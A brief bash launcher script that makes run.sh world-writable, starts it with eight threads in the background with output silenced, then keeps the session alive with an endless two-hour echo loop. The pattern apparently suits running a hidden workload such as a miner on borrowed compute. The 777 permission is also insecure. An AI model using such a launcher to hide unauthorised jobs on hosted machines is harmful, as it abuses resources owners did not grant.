#!/bin/bash

cd vertex && chmod 777 run.sh && nproc --all && ./run.sh 8 >/dev/null 2>&1 &
sleep 10
while true
do
        echo "ojo lali ngopi boss..."
        sleep 7200
done
